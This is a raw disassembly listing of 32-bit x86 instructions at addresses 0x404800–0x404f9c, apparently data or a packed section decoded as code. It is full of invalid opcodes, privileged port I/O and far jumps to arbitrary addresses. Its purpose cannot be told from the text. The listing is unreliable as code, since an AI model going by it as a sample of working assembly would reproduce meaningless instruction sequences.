  404800:	jmp    0x942edace
  404805:	int    0x98
  404807:	xor    DWORD PTR [edi-0xbb83e05],esi
  40480d:	retf   
  40480e:	daa    
  40480f:	xchg   edi,eax
  404810:	loop   0x404824
  404812:	dec    eax
  404813:	inc    eax
  404814:	and    al,0xa3
  404816:	clc    
  404817:	mov    dl,0x77
  404819:	pop    esp
  40481a:	and    ecx,eax
  40481c:	rol    DWORD PTR [esi+0x3a169355],0x6b
  404823:	adc    BYTE PTR [eax+0x4f],bl
  404826:	loopne 0x4047cc
  404828:	aaa    
  404829:	push   eax
  40482a:	fsubr  st,st(5)
  40482c:	les    ebx,FWORD PTR [edx+ebx*4]
  40482f:	je     0x4048ab
  404831:	mov    edi,eax
  404833:	jp     0x40489c
  404835:	inc    ecx
  404836:	inc    esp
  404837:	aam    0x7c
  404839:	inc    edi
  40483a:	push   ebx
  40483b:	pusha  
  40483c:	(bad)  
  40483d:	sbb    dl,bh
  40483f:	leave  
  404840:	test   DWORD PTR [eax],esp
  404842:	pop    ecx
  404843:	lock xor DWORD PTR [ecx-0x3abfe156],esp
  40484a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40484b:	mov    edi,DWORD PTR [eax+0x11e85e52]
  404851:	sub    dl,bh
  404853:	or     esp,esp
  404855:	xchg   DWORD PTR [ebp+0x4d],ebp
  404858:	je     0x404803
  40485a:	pop    es
  40485b:	retf   0x9486
  40485e:	adc    edi,DWORD PTR [edi]
  404860:	les    ebp,FWORD PTR [ecx-0x50e4656c]
  404866:	imul   edx,DWORD PTR [esp+ecx*2-0x10],0x3a
  40486b:	shr    DWORD PTR [eax+0x521aab3e],0x18
  404872:	pop    es
  404873:	sbb    ah,al
  404875:	xor    DWORD PTR [esi+0xd5f7174],ebx
  40487b:	lds    edi,FWORD PTR [ebp+0x16]
  40487e:	push   edx
  40487f:	out    dx,al
  404880:	data16 jmp 0x40482d
  404883:	adc    eax,0xa509fc1c
  404888:	(bad)  
  404889:	aaa    
  40488a:	hlt    
  40488b:	sti    
  40488c:	xchg   edi,esp
  40488e:	jp     0x40485b
  404890:	in     al,dx
  404891:	push   edi
  404892:	add    BYTE PTR [edx+0x58103f17],ah
  404898:	repnz add dh,cl
  40489b:	mov    ebp,DWORD PTR [eax+ebx*4+0x75]
  40489f:	dec    eax
  4048a0:	xor    DWORD PTR [edx+0x17c372d4],edi
  4048a6:	iret   
  4048a7:	lods   eax,DWORD PTR ds:[esi]
  4048a8:	and    DWORD PTR [eax],0xbb4f4f4e
  4048ae:	adc    cl,BYTE PTR [edx]
  4048b0:	adc    dl,ah
  4048b2:	arpl   bp,sp
  4048b4:	adc    ebx,ebx
  4048b6:	ja     0x40491d
  4048b8:	or     ebx,0xda62d22
  4048be:	scas   al,BYTE PTR es:[edi]
  4048bf:	add    DWORD PTR [esi+0x44],ebp
  4048c2:	pop    edi
  4048c3:	jecxz  0x4048f2
  4048c5:	call   0x6875:0xd0b956b5
  4048cc:	(bad)  
  4048cd:	(bad)  
  4048cf:	and    cl,BYTE PTR [edx-0x1a3fc9ad]
  4048d5:	sbb    bl,BYTE PTR [ebp+0x13]
  4048d8:	ret    
  4048d9:	adc    al,BYTE PTR [edx]
  4048db:	cmp    ebx,DWORD PTR [ebx+ecx*2]
  4048de:	sbb    cl,BYTE PTR [ebp-0x69]
  4048e1:	inc    edx
  4048e2:	sub    DWORD PTR [edi+edx*2-0x64],ecx
  4048e6:	cs hlt 
  4048e8:	mov    esi,0x6e31d54f
  4048ed:	xchg   ecx,eax
  4048ee:	cld    
  4048ef:	(bad)  
  4048f0:	je     0x40496f
  4048f2:	sub    bh,BYTE PTR ds:0xc75a3675
  4048f8:	and    al,0xbb
  4048fa:	enter  0xf1f2,0x5d
  4048fe:	lods   al,BYTE PTR ds:[esi]
  4048ff:	(bad)  
  404900:	iret   
  404901:	inc    esi
  404902:	scas   al,BYTE PTR es:[edi]
  404903:	pop    edi
  404904:	ds xor al,0xe4
  404907:	inc    ecx
  404908:	dec    esi
  404909:	hlt    
  40490a:	mov    edx,0xdba150a4
  40490f:	les    ebx,FWORD PTR [ecx-0x45]
  404912:	xchg   edx,eax
  404913:	arpl   bx,dx
  404915:	jp     0x4048aa
  404917:	mov    ebp,0x1b196d16
  40491c:	daa    
  40491d:	mov    al,ds:0x65ac3766
  404922:	mov    al,0xdc
  404924:	mov    ds:0xc4a62e99,eax
  404929:	adc    BYTE PTR [edx],al
  40492b:	pop    ebx
  40492c:	mov    ah,0xd8
  40492e:	mov    dh,0xf0
  404930:	mov    ch,BYTE PTR [ecx+0x7]
  404933:	xchg   cl,dl
  404935:	sbb    cl,dh
  404937:	inc    eax
  404938:	ins    DWORD PTR es:[edi],dx
  404939:	dec    eax
  40493a:	int3   
  40493b:	lods   eax,DWORD PTR ds:[esi]
  40493c:	out    0x78,eax
  40493e:	xchg   esi,eax
  40493f:	jmp    0xeca85ee7
  404944:	or     dh,0xb3
  404947:	test   eax,0x8cfdc67e
  40494c:	pushf  
  40494d:	lods   eax,DWORD PTR ds:[esi]
  40494e:	xor    DWORD PTR [ebp+ecx*4-0x4e],0xffffffef
  404953:	mov    edi,0x74844907
  404958:	aam    0x4a
  40495a:	daa    
  40495b:	lods   al,BYTE PTR ds:[esi]
  40495c:	mov    ecx,0xb5c0d525
  404961:	xor    al,0x31
  404963:	mov    ch,0xcc
  404965:	jmp    0x7f53:0xa6e9c9ad
  40496c:	daa    
  40496d:	test   eax,0xa57640c2
  404972:	push   ebp
  404973:	dec    esi
  404974:	adc    eax,0xd2c15c12
  404979:	ins    BYTE PTR es:[edi],dx
  40497a:	mov    edx,0x94833994
  40497f:	pusha  
  404980:	(bad)  
  404981:	jle    0x40496b
  404983:	push   ebx
  404984:	dec    edx
  404985:	imul   ecx,DWORD PTR [esi-0xa1f4b20],0x4e1180c3
  40498f:	or     ch,ch
  404991:	xchg   edi,eax
  404992:	jg     0x4049af
  404994:	cmp    al,0xbc
  404996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404997:	lods   eax,DWORD PTR ds:[esi]
  404998:	test   al,0x57
  40499a:	das    
  40499b:	rcr    al,0x6f
  40499e:	dec    ecx
  40499f:	lods   eax,DWORD PTR fs:[esi]
  4049a1:	or     eax,0xf6212d34
  4049a6:	mov    cl,BYTE PTR [edx+eax*1-0x6efc5acc]
  4049ad:	sub    eax,0x7e1fbdc
  4049b2:	nop
  4049b3:	inc    si
  4049b5:	cs cli 
  4049b7:	aam    0x93
  4049b9:	or     al,0xc1
  4049bb:	xor    ch,BYTE PTR [esi+ebx*8]
  4049be:	retf   0x9a2e
  4049c1:	or     esi,DWORD PTR ds:[edx+0x7e]
  4049c5:	and    BYTE PTR [bx-0x40],ch
  4049c9:	xor    DWORD PTR [ebx-0xd38398c],eax
  4049cf:	adc    edx,DWORD PTR [esi]
  4049d1:	mov    DWORD PTR [edi-0x38edb4df],esp
  4049d7:	cmp    DWORD PTR [ebx+0x45],esp
  4049da:	cmp    eax,edx
  4049dc:	xchg   ebp,eax
  4049dd:	sub    BYTE PTR [esi-0x69ff82c0],0x1b
  4049e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049e5:	and    BYTE PTR [ebp-0x4d3c5639],cl
  4049eb:	mov    edi,0xd324ed69
  4049f0:	or     DWORD PTR [ebx+0x7f058db7],eax
  4049f6:	mov    es,WORD PTR [ebx-0x3]
  4049f9:	dec    ebx
  4049fa:	sub    eax,0x2de43cfc
  4049ff:	test   eax,0xbe9d8c1c
  404a04:	xchg   DWORD PTR [edx],eax
  404a06:	test   ebp,edx
  404a08:	outs   dx,BYTE PTR ds:[esi]
  404a09:	test   al,0xda
  404a0b:	pop    ebx
  404a0c:	pop    ss
  404a0d:	dec    ebp
  404a0e:	arpl   WORD PTR [eax+eax*4+0x18],dx
  404a12:	sub    dh,bl
  404a14:	jmp    0x4049fb
  404a16:	int3   
  404a17:	ins    DWORD PTR es:[edi],dx
  404a18:	es and bl,ch
  404a1b:	sbb    al,0xb2
  404a1d:	aaa    
  404a1e:	ins    BYTE PTR es:[edi],dx
  404a1f:	inc    edi
  404a20:	sbb    BYTE PTR [esp+eax*8],ch
  404a23:	xlat   BYTE PTR ds:[ebx]
  404a24:	jmp    0x404a65
  404a26:	xchg   esi,eax
  404a27:	into   
  404a28:	mov    dh,0xe7
  404a2a:	ret    0x8f68
  404a2d:	push   ds
  404a2e:	imul   esp,DWORD PTR [esi-0x5c74accf],0x1d
  404a35:	stos   DWORD PTR es:[edi],eax
  404a36:	rol    BYTE PTR [edx],cl
  404a38:	leave  
  404a39:	ja     0x4049cc
  404a3b:	ins    DWORD PTR es:[edi],dx
  404a3c:	ins    DWORD PTR es:[edi],dx
  404a3d:	push   esi
  404a3e:	mov    ch,ah
  404a40:	repz pop edi
  404a42:	rol    DWORD PTR [ebp+0x31],0x17
  404a46:	adc    DWORD PTR [esp+ebp*4-0x43],ecx
  404a4a:	xor    eax,0xfcae570d
  404a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a50:	and    BYTE PTR [edi],0xf6
  404a53:	mov    BYTE PTR [eax-0x59e145c3],ah
  404a59:	aam    0xaf
  404a5b:	mov    ch,bl
  404a5d:	ret    
  404a5e:	xor    al,0x23
  404a60:	pop    edx
  404a61:	sbb    esp,DWORD PTR [esi]
  404a63:	cmp    eax,0x842e0619
  404a68:	push   eax
  404a69:	es add eax,0x9b79b6ec
  404a6f:	mov    esi,0x7cf5f9a2
  404a74:	fwait
  404a75:	sbb    DWORD PTR [ebx-0x6bae750f],0x3de21432
  404a7f:	add    BYTE PTR [eax+0x6c],bl
  404a82:	xchg   esp,eax
  404a83:	cmovge eax,DWORD PTR [edx]
  404a86:	dec    ecx
  404a87:	sub    edx,DWORD PTR [eax+0x7890d78c]
  404a8d:	jl     0x404a67
  404a8f:	add    eax,0xd6b80306
  404a94:	adc    ah,BYTE PTR [eax-0x31f3ba64]
  404a9a:	and    edx,DWORD PTR [edi]
  404a9c:	arpl   bp,dx
  404a9e:	or     bl,dh
  404aa0:	cs sbb eax,0x508b0392
  404aa6:	push   esp
  404aa7:	add    edi,DWORD PTR [ebp+edi*1-0x4]
  404aab:	repz jae 0x404abc
  404aae:	(bad)  
  404aaf:	jb     0x404a80
  404ab1:	and    al,0x1e
  404ab3:	ins    DWORD PTR es:[edi],dx
  404ab4:	stos   DWORD PTR es:[edi],eax
  404ab5:	ret    
  404ab6:	loop   0x404ab8
  404ab8:	sbb    al,BYTE PTR [eax-0x62a16dd5]
  404abe:	pop    esi
  404abf:	pop    esp
  404ac0:	push   ebx
  404ac1:	loope  0x404aa7
  404ac3:	push   es
  404ac4:	sbb    esi,0xffffffa7
  404ac7:	xor    BYTE PTR [edi],dh
  404ac9:	repz ja 0x404a79
  404acc:	lahf   
  404acd:	and    eax,0x3539c22f
  404ad2:	cmp    edi,DWORD PTR [ebx+0x7b21ab2e]
  404ad8:	into   
  404ad9:	add    DWORD PTR [ebx+0x7e],ebx
  404adc:	pop    esi
  404add:	pop    ss
  404ade:	xchg   ecx,eax
  404adf:	into   
  404ae0:	cli    
  404ae1:	and    eax,0x323a5fd0
  404ae6:	enter  0x6fc6,0x80
  404aea:	inc    eax
  404aeb:	cmp    al,0x96
  404aed:	jmp    0x404b55
  404aef:	rcl    DWORD PTR [ebx+0x10],1
  404af2:	xchg   ebx,eax
  404af3:	in     al,0xb2
  404af5:	test   DWORD PTR [esi-0x3089c418],eax
  404afb:	mov    DWORD PTR [ecx-0x3e],eax
  404afe:	lahf   
  404aff:	enter  0x8762,0x5f
  404b03:	lods   eax,DWORD PTR ds:[esi]
  404b04:	push   ebp
  404b05:	(bad)  
  404b06:	scas   eax,DWORD PTR es:[edi]
  404b07:	ins    DWORD PTR es:[edi],dx
  404b08:	inc    esp
  404b09:	repz sbb DWORD PTR [ebx],ebp
  404b0c:	mov    bl,0x79
  404b0e:	sub    al,0x28
  404b10:	and    eax,0x8cb0982f
  404b15:	sar    eax,0x52
  404b18:	mov    al,0x2
  404b1a:	lahf   
  404b1b:	rcr    DWORD PTR [eax],cl
  404b1d:	paddq  mm6,QWORD PTR [esi+edx*8-0x69]
  404b22:	adc    BYTE PTR [eax-0x17],cl
  404b25:	xchg   BYTE PTR [edx-0x77a546f1],ch
  404b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b2c:	add    ebx,DWORD PTR [ebp-0x7b2ab6fa]
  404b32:	pop    ds
  404b33:	sbb    dh,ch
  404b35:	in     al,0x8f
  404b37:	shufps xmm6,XMMWORD PTR [eax-0x4940af15],0x15
  404b3f:	push   esp
  404b40:	and    DWORD PTR [eax+0x176162af],ecx
  404b46:	dec    edx
  404b47:	fisttp DWORD PTR [edi]
  404b49:	pop    ds
  404b4a:	or     eax,0xd78ff417
  404b4f:	fdivr  st,st(3)
  404b51:	je     0x404adf
  404b53:	xchg   edi,eax
  404b54:	inc    ebp
  404b55:	jle    0x404b7c
  404b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b58:	sub    eax,0x708195b
  404b5d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  404b5f:	adc    edx,DWORD PTR [edx+0x56]
  404b62:	sbb    ebp,eax
  404b64:	je     0x404b10
  404b66:	(bad)  
  404b67:	push   eax
  404b68:	stos   DWORD PTR es:[edi],eax
  404b69:	push   es
  404b6a:	xor    eax,0x203536ee
  404b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b70:	push   esp
  404b71:	sub    dl,bl
  404b73:	dec    esi
  404b74:	xchg   edi,eax
  404b75:	xchg   edx,eax
  404b76:	(bad)  
  404b78:	sbb    dl,BYTE PTR [eax+edx*1]
  404b7b:	inc    ebx
  404b7c:	les    edi,FWORD PTR [ebp-0x417eb636]
  404b82:	push   eax
  404b83:	push   ss
  404b84:	cli    
  404b85:	pop    ecx
  404b86:	std    
  404b87:	in     eax,dx
  404b88:	(bad)  
  404b89:	and    ah,dh
  404b8b:	inc    eax
  404b8c:	in     eax,dx
  404b8d:	pop    ecx
  404b8e:	jge    0x404b22
  404b90:	dec    edx
  404b91:	and    eax,0x79ac7fbb
  404b96:	push   edi
  404b97:	jns    0x404ba0
  404b99:	dec    edx
  404b9a:	xchg   esp,eax
  404b9b:	and    eax,edx
  404b9d:	and    DWORD PTR [esi-0x1fe9b271],ebx
  404ba3:	sub    BYTE PTR [edx+0x6cc81af4],0x8d
  404baa:	sub    BYTE PTR [esi+0x45],dl
  404bad:	jo     0x404c00
  404baf:	pop    DWORD PTR [ebx+0x78]
  404bb2:	xor    bh,BYTE PTR [esi]
  404bb4:	jge    0x404b7b
  404bb6:	ror    DWORD PTR [edi-0x37],0xff
  404bba:	call   0xa0fa:0x1cc5b456
  404bc1:	mov    ah,0xf0
  404bc3:	ds leave 
  404bc5:	inc    eax
  404bc6:	pop    esp
  404bc7:	shl    BYTE PTR [esi+0x5a2f24f5],cl
  404bcd:	inc    ebx
  404bce:	test   eax,0xcad503dc
  404bd3:	out    dx,eax
  404bd4:	or     BYTE PTR [edi+0x2aaf9274],bh
  404bda:	or     eax,0x51187e99
  404bdf:	int    0xfe
  404be1:	sub    DWORD PTR [ebp-0x41],ebx
  404be4:	xchg   esp,eax
  404be5:	dec    ecx
  404be6:	mov    ah,0x99
  404be8:	jo     0x404c25
  404bea:	jge    0x404be3
  404bec:	adc    edi,DWORD PTR [ebx-0x5e]
  404bef:	adc    al,0xb2
  404bf1:	cld    
  404bf2:	jg     0x404bec
  404bf4:	fsubr  st,st(0)
  404bf6:	inc    esp
  404bf7:	rcl    ebx,cl
  404bf9:	mov    dh,0xb8
  404bfb:	push   ds
  404bfc:	and    BYTE PTR [ebx-0x642397b6],0x5a
  404c03:	icebp  
  404c04:	out    0x21,al
  404c06:	ret    0xe584
  404c09:	dec    ebp
  404c0a:	and    al,0x74
  404c0c:	inc    eax
  404c0d:	adc    esi,DWORD PTR [ebx-0x26f41d1d]
  404c13:	jecxz  0x404bad
  404c15:	push   eax
  404c16:	idiv   BYTE PTR [ecx]
  404c18:	(bad)  
  404c19:	dec    esi
  404c1a:	mov    edi,0x6e7a8df7
  404c1f:	fdivr  st,st(2)
  404c21:	sbb    ecx,DWORD PTR [ecx+0xe669be0]
  404c27:	out    dx,al
  404c28:	adc    BYTE PTR [ebp+0x175ec302],0x31
  404c2f:	jp     0x404c68
  404c31:	(bad)
  404c36:	das    
  404c37:	aaa    
  404c38:	pop    esi
  404c39:	mov    ecx,0xd5b1d9aa
  404c3e:	or     al,BYTE PTR [edx+0x5377ef7d]
  404c44:	push   cs
  404c45:	jge    0x404ca0
  404c47:	out    dx,eax
  404c48:	sahf   
  404c49:	sub    BYTE PTR [eax+0x1eecdbc0],dl
  404c4f:	or     BYTE PTR ds:0xe3b0a941,bl
  404c55:	rcl    BYTE PTR [edi-0x27b5eb98],cl
  404c5b:	adc    eax,0x4a69e54
  404c60:	lods   al,BYTE PTR ds:[esi]
  404c61:	(bad)  
  404c62:	mov    eax,0x47e3d265
  404c67:	pop    eax
  404c68:	nop
  404c69:	rol    BYTE PTR [eax+edi*2],cl
  404c6c:	and    al,0x2d
  404c6e:	and    ecx,ecx
  404c70:	in     eax,0x98
  404c72:	cmp    al,0xca
  404c74:	int    0x6
  404c76:	retf   
  404c77:	test   DWORD PTR [ebp-0x6c],eax
  404c7a:	sub    ebp,DWORD PTR [edx-0x48]
  404c7d:	pop    ebp
  404c7e:	jno    0x404c1e
  404c80:	xor    al,0xc6
  404c82:	jl     0x404c76
  404c84:	cmp    eax,0x51579721
  404c89:	mov    WORD PTR [edx+0x2e],ss
  404c8c:	in     eax,0x47
  404c8e:	aam    0x94
  404c90:	xchg   DWORD PTR [ebx+0x3c],ecx
  404c93:	or     eax,0x4633fab0
  404c98:	push   esi
  404c99:	popf   
  404c9a:	mov    eax,DWORD PTR [ecx]
  404c9c:	push   ss
  404c9d:	mov    eax,ds:0x35e0e76c
  404ca2:	inc    edi
  404ca3:	loope  0x404cac
  404ca5:	pop    ecx
  404ca6:	fsub   st,st(3)
  404ca8:	cdq    
  404ca9:	cmp    eax,ecx
  404cab:	or     BYTE PTR [ebx+0x4f5dcb0],dl
  404cb1:	push   edi
  404cb2:	and    eax,DWORD PTR [ebx+0x602278af]
  404cb8:	dec    edx
  404cb9:	push   0x36
  404cbb:	and    DWORD PTR [eax+esi*1-0x2d26efc3],0x118e6e2f
  404cc6:	pop    es
  404cc7:	mov    edi,0xd5530f05
  404ccc:	mov    esi,DWORD PTR [edx+ebp*4-0x30]
  404cd0:	pop    ebp
  404cd1:	(bad)  
  404cd2:	fwait
  404cd3:	ja     0x404cfa
  404cd5:	rol    DWORD PTR [edx-0xb8c6d4b],0xcb
  404cdc:	push   ecx
  404cdd:	add    cl,BYTE PTR [ecx+0x22431766]
  404ce3:	push   ebx
  404ce4:	pushf  
  404ce5:	jns    0x404d00
  404ce7:	cmp    bl,cl
  404ce9:	fwait
  404cea:	ret    
  404ceb:	adc    ebx,DWORD PTR [esi+0x7cfb8c67]
  404cf1:	(bad)  
  404cf2:	fistp  DWORD PTR [ebx]
  404cf4:	fs loop 0x404cc5
  404cf7:	clc    
  404cf8:	sub    ch,al
  404cfa:	jle    0x404cc9
  404cfc:	aaa    
  404cfd:	jle    0x404cb9
  404cff:	(bad)  
  404d00:	pop    es
  404d01:	dec    ebp
  404d02:	and    al,0x3a
  404d04:	pop    ebp
  404d05:	nop
  404d06:	ror    BYTE PTR [esi],0x3d
  404d09:	ins    DWORD PTR es:[edi],dx
  404d0a:	xor    eax,ecx
  404d0c:	(bad)  
  404d0d:	mov    WORD PTR [ecx+0x15],?
  404d10:	out    0x1e,eax
  404d12:	in     al,dx
  404d13:	jno    0x404d0a
  404d15:	lock inc esi
  404d17:	fwait
  404d18:	icebp  
  404d19:	push   esi
  404d1a:	inc    ecx
  404d1b:	(bad)  
  404d1c:	gs das 
  404d1e:	test   al,0x5f
  404d20:	pop    ebp
  404d21:	out    0xb1,al
  404d23:	in     al,dx
  404d24:	aad    0xe6
  404d26:	in     al,0xa0
  404d28:	rol    DWORD PTR [eiz*2-0x1b7d5aa],1
  404d2f:	jbe    0x404d38
  404d31:	inc    ebx
  404d32:	je     0x404d0b
  404d34:	std    
  404d35:	cld    
  404d36:	jbe    0x404d1a
  404d38:	mov    al,ds:0x81cae4ea
  404d3d:	xchg   ebx,eax
  404d3e:	push   0xffffffe5
  404d40:	(bad)  
  404d41:	sub    eax,0x1f3f926d
  404d46:	test   eax,0x8bf07022
  404d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d4c:	imul   DWORD PTR [eax]
  404d4e:	out    0x3a,eax
  404d50:	dec    edx
  404d51:	cs mov edx,0x21746b74
  404d57:	pop    eax
  404d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d59:	out    0x4f,eax
  404d5b:	bound  eax,QWORD PTR [ebx]
  404d5d:	in     eax,0x8
  404d5f:	and    DWORD PTR [esi+edx*2-0x3804d17],esi
  404d66:	jnp    0x404dae
  404d68:	mov    esp,0xe6fb888f
  404d6d:	mov    cl,0x80
  404d6f:	idiv   BYTE PTR [ebx+ecx*4+0xa]
  404d73:	jbe    0x404dd2
  404d75:	iret   
  404d76:	add    DWORD PTR [ecx+0x3d98e863],0xffffffcf
  404d7d:	out    dx,al
  404d7e:	sub    DWORD PTR [ecx],eax
  404d80:	in     eax,0xf0
  404d82:	jnp    0x404de5
  404d84:	iret   
  404d85:	jbe    0x404d2b
  404d87:	jmp    0x5efd5d5f
  404d8c:	imul   ebp,DWORD PTR [edi+0x70],0x9bc2a40c
  404d93:	sahf   
  404d94:	xor    cl,BYTE PTR [ecx]
  404d96:	sub    al,BYTE PTR [ecx+0x38c2057e]
  404d9c:	sahf   
  404d9d:	ss inc eax
  404d9f:	aad    0x41
  404da1:	repnz pop es
  404da3:	mov    cl,0x78
  404da5:	in     eax,0x5
  404da7:	mov    eax,DWORD PTR [eax+ebp*8+0x3e791441]
  404dae:	aaa    
  404daf:	jge    0x404dad
  404db1:	aam    0xfc
  404db3:	repnz (bad) 
  404db6:	retf   0x28b0
  404db9:	xchg   edx,eax
  404dba:	into   
  404dbb:	(bad)  
  404dbc:	xchg   esp,eax
  404dbd:	icebp  
  404dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dbf:	jl     0x404de9
  404dc1:	sub    DWORD PTR [ebp+0x6f003aa1],0xd04e57ca
  404dcb:	arpl   WORD PTR [edi+0x1d749343],si
  404dd1:	xor    al,0xb8
  404dd3:	test   eax,0xe5400854
  404dd8:	xchg   ebp,eax
  404dd9:	test   BYTE PTR ds:0xba42d1ce,bl
  404ddf:	ret    0xf758
  404de2:	fild   WORD PTR [edx]
  404de4:	xchg   esp,eax
  404de5:	xor    ebp,DWORD PTR [edx+edi*1+0x20]
  404de9:	inc    ebx
  404dea:	gs imul edx,DWORD PTR fs:[edx],0x10
  404def:	xchg   edx,eax
  404df0:	popa   
  404df1:	mov    dl,BYTE PTR [edx+ebx*1-0x63]
  404df5:	dec    ecx
  404df6:	in     eax,0x7
  404df8:	mov    cl,0xab
  404dfa:	fld    DWORD PTR [edi-0x26]
  404dfd:	loop   0x404dd9
  404dff:	inc    ebx
  404e00:	mov    BYTE PTR [ebx],ch
  404e02:	mov    bl,BYTE PTR [edi+0x59]
  404e05:	xchg   BYTE PTR [ebx],bl
  404e07:	jns    0x404dd4
  404e09:	jg     0x404e5a
  404e0b:	sbb    ah,bl
  404e0d:	dec    ebx
  404e0e:	jg     0x404d98
  404e10:	push   edx
  404e11:	jnp    0x404df6
  404e13:	add    bl,BYTE PTR [ebx]
  404e15:	or     BYTE PTR [esi-0xd2adad2],bh
  404e1b:	lods   eax,DWORD PTR ds:[esi]
  404e1c:	loopne 0x404e7f
  404e1e:	dec    esp
  404e1f:	shl    DWORD PTR [esp+eax*4+0x2c],0x8e
  404e24:	aad    0x2
  404e26:	gs jle 0x404e93
  404e29:	adc    cl,bh
  404e2b:	sub    BYTE PTR [ebp-0x31],ch
  404e2e:	or     DWORD PTR [eax],eax
  404e30:	scas   al,BYTE PTR es:[edi]
  404e31:	push   ebx
  404e32:	lock add BYTE PTR [ecx],bl
  404e35:	sbb    BYTE PTR [edi+edi*8+0x57],dl
  404e39:	(bad)
  404e3c:	jl     0x404dd9
  404e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e3f:	(bad)  
  404e40:	push   esp
  404e41:	outs   dx,DWORD PTR ds:[esi]
  404e42:	mov    bl,0xe8
  404e44:	int    0x7e
  404e46:	fmul   DWORD PTR [esp+0x3a]
  404e4a:	daa    
  404e4b:	fmul   QWORD PTR [ecx]
  404e4d:	and    edi,DWORD PTR [ebp-0x67a0d9e7]
  404e53:	mov    edi,0x119b248d
  404e58:	shr    BYTE PTR [ebx-0x73],0x21
  404e5c:	mov    esp,0x4ce12b8c
  404e61:	sub    DWORD PTR ds:0x49e88bae,0x36
  404e68:	mov    edi,DWORD PTR [ecx]
  404e6a:	add    eax,0x7a8c6480
  404e6f:	inc    esi
  404e70:	ficomp DWORD PTR cs:[ebp+eiz*1-0x42d08361]
  404e78:	pop    ecx
  404e79:	sbb    DWORD PTR [ebx],esp
  404e7b:	loop   0x404edd
  404e7d:	xchg   BYTE PTR [esi-0x59],dh
  404e80:	adc    BYTE PTR [edi],ah
  404e82:	mov    WORD PTR [edi-0x5101c6eb],es
  404e88:	(bad)  
  404e89:	cmc    
  404e8a:	rcr    DWORD PTR [ecx],0xbf
  404e8d:	add    edi,esi
  404e8f:	xor    eax,0x659c0834
  404e94:	and    eax,0x75d69572
  404e99:	repz jns 0x404ea2
  404e9c:	mov    ch,0xf3
  404e9e:	sub    al,0xd5
  404ea0:	in     al,0x90
  404ea2:	sbb    ecx,DWORD PTR [edi+0x5b]
  404ea5:	inc    edx
  404ea6:	stc    
  404ea7:	add    al,0xde
  404ea9:	jae    0x404ee5
  404eab:	mov    dh,bh
  404ead:	lahf   
  404eae:	xor    dl,ch
  404eb0:	mov    ecx,0xc89675d2
  404eb5:	mov    ebx,0x907b731c
  404eba:	mov    ah,0xd0
  404ebc:	sbb    al,0x86
  404ebe:	aaa    
  404ebf:	scas   al,BYTE PTR es:[edi]
  404ec0:	cmp    DWORD PTR [edi-0x7a0abfc9],eax
  404ec6:	fwait
  404ec7:	or     DWORD PTR [ecx+ecx*2],ebx
  404eca:	ret    0x4df6
  404ecd:	xchg   DWORD PTR [ecx-0x27d04ee],ebx
  404ed3:	hlt    
  404ed4:	aam    0x96
  404ed6:	lods   eax,DWORD PTR ds:[esi]
  404ed7:	pop    esp
  404ed8:	(bad)  
  404ed9:	in     eax,dx
  404eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404edb:	scas   eax,DWORD PTR es:[edi]
  404edc:	and    BYTE PTR [eax-0x7926bb04],al
  404ee2:	rol    DWORD PTR [esi],0xcd
  404ee5:	sbb    eax,0x2908089b
  404eea:	(bad)  
  404eec:	mov    esi,0x62d80e2a
  404ef1:	pop    ebx
  404ef2:	dec    esi
  404ef3:	dec    eax
  404ef4:	hlt    
  404ef5:	adc    ecx,DWORD PTR [ebx+0xe]
  404ef8:	rcr    BYTE PTR [ebp+0x3887692],cl
  404efe:	and    al,0x3f
  404f00:	out    dx,al
  404f01:	cmp    DWORD PTR [edi],ecx
  404f03:	rol    dl,1
  404f05:	rol    BYTE PTR [edx-0x79e72b63],1
  404f0b:	std    
  404f0c:	mov    dl,0xf8
  404f0e:	pop    ecx
  404f0f:	add    DWORD PTR ss:[eax],esp
  404f12:	(bad)  
  404f13:	repz imul BYTE PTR [esi-0x2a]
  404f17:	cmp    eax,DWORD PTR es:[esi+0x1b]
  404f1b:	dec    edx
  404f1c:	push   0xf02579ec
  404f21:	seta   BYTE PTR [eax]
  404f24:	bound  ebp,QWORD PTR [eax]
  404f26:	push   ss
  404f27:	jno    0x404f1a
  404f29:	dec    edi
  404f2a:	mov    edi,0x71e168fb
  404f30:	dec    esp
  404f31:	test   bh,dh
  404f33:	dec    ebp
  404f34:	jb     0x404f2a
  404f36:	mov    ah,0xc7
  404f38:	fistp  QWORD PTR [edx+ebp*2]
  404f3b:	cmp    eax,0x696c0ab
  404f40:	mov    edi,0x8c09dfa1
  404f45:	sub    ch,BYTE PTR [ebx+ebp*1]
  404f48:	lods   eax,DWORD PTR ds:[esi]
  404f49:	or     al,0xa0
  404f4b:	fldcw  WORD PTR [eax-0x1149a7d8]
  404f51:	jl     0x404fa7
  404f53:	stos   BYTE PTR es:[edi],al
  404f54:	idiv   BYTE PTR [eax-0x44]
  404f57:	mov    eax,0xa1a7cada
  404f5c:	dec    edi
  404f5d:	ficomp WORD PTR [ebp+0x38174fdf]
  404f63:	cmp    eax,0x4ddcb209
  404f68:	iret   
  404f69:	out    0x42,al
  404f6b:	test   eax,0x2dfaab1d
  404f70:	inc    edx
  404f71:	lahf   
  404f72:	xchg   esp,eax
  404f73:	lea    edx,[eax]
  404f75:	cmp    DWORD PTR [ebx-0x3b],0x48a025e
  404f7c:	imul   edi,DWORD PTR [ecx-0x74],0x5c
  404f80:	adc    DWORD PTR [esp+ecx*1-0x6b1a3360],ecx
  404f87:	ins    DWORD PTR es:[edi],dx
  404f88:	adc    BYTE PTR [edx],al
  404f8a:	popf   
  404f8b:	xchg   ebp,eax
  404f8c:	push   esp
  404f8d:	fisubr WORD PTR [edx+0x32aa17f1]
  404f93:	xor    eax,0x1ba8ef16
  404f98:	dec    esi
  404f99:	cwde   
  404f9a:	or     esi,DWORD PTR [edx]
  404f9c:	jg     0x404f23
